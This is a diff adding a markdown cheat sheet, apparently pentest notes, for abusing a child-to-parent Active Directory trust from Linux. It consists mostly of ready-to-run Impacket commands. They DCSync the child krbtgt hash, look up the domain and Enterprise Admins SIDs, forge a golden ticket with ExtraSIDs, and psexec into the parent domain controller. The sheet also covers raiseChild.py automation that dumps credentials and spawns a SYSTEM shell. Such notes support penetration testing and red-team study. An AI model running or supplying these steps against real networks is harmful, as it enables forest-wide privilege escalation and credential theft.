@@ -303,3 +303,125 @@ Once the **child domain is popped**, forging a ticket with the parent’s **Ente
 
 ---
 
+
+## **Attacking Domain Trusts – Child → Parent (Linux Edition)**
+
+*(Short, tactical, ready for the field)*
+
+---
+
+# **Child → Parent Trust Abuse from Linux (Quick Cheatsheet)**
+
+### **What You Need**
+
+* ✔ KRBTGT NT hash (child domain)
+* ✔ Child domain SID
+* ✔ Any username (real or fake)
+* ✔ Child domain FQDN
+* ✔ Parent domain Enterprise Admins SID
+
+---
+
+## **1. DCSync KRBTGT Hash (Child Domain)**
+
+```bash
+secretsdump.py child.local/admin@CHILD-DC-IP -just-dc-user CHILD/krbtgt
+```
+
+Extract the **NT hash** (used with `-nthash` in ticketer).
+
+---
+
+## **2. Brute-Force/Enumerate Child Domain SID**
+
+```bash
+lookupsid.py child.local/user@CHILD-DC-IP | grep "Domain SID"
+```
+
+Output Example:
+
+```
+[*] Domain SID is: S-1-5-21-XXXXXXXX-XXXXXXXX-XXXXXXXX
+```
+
+---
+
+## **3. Get Enterprise Admins SID (Parent Domain)**
+
+```bash
+lookupsid.py parent.local/user@PARENT-DC-IP | grep -B12 "Enterprise Admins"
+```
+
+Append `-519` RID to the parent SID.
+
+---
+
+## **4. Forge Golden Ticket (ticketer.py)**
+
+```bash
+ticketer.py \
+  -nthash <KRBTGT_NT_HASH> \
+  -domain CHILD.LOCAL \
+  -domain-sid <CHILD_DOMAIN_SID> \
+  -extra-sid <PARENT_DOMAIN_ENTERPRISE_ADMINS_SID> \
+  hacker
+```
+
+Saves: **hacker.ccache**
+
+---
+
+## **5. Use the Golden Ticket**
+
+```bash
+export KRB5CCNAME=hacker.ccache
+```
+
+---
+
+## **6. Test Authentication Into Parent Domain**
+
+```bash
+psexec.py CHILD.LOCAL/hacker@PARENT-DC-FQDN -k -no-pass -target-ip PARENT-DC-IP
+```
+
+If successful:
+
+```
+nt authority/system
+```
+
+🎉 **Parent Domain compromised. Full Enterprise Admin privilege.**
+
+---
+
+# **Automated Option (raiseChild.py)**
+
+```bash
+raiseChild.py -target-exec PARENT-DC-IP CHILD.LOCAL/admin
+```
+
+Performs automatically:
+
+* Gets child + parent domain info
+* Retrieves KRBTGT hashes
+* Builds Golden Ticket
+* Injects ExtraSIDs
+* Logs into parent domain
+* Dumps admin creds
+* Optionally spawns SYSTEM shell
+
+**BUT:** Use manual steps whenever possible — safer in production, easier to troubleshoot.
+
+---
+
+# **Workflow Summary (1-Page Memory Aid)**
+
+1️⃣ **DCSync → KRBTGT (child)**
+2️⃣ **lookupsid → Child SID**
+3️⃣ **lookupsid → Parent EA SID**
+4️⃣ **ticketer → Golden Ticket w/ ExtraSIDs**
+5️⃣ **export KRB5CCNAME**
+6️⃣ **psexec → Pop Parent DC**
+
+---
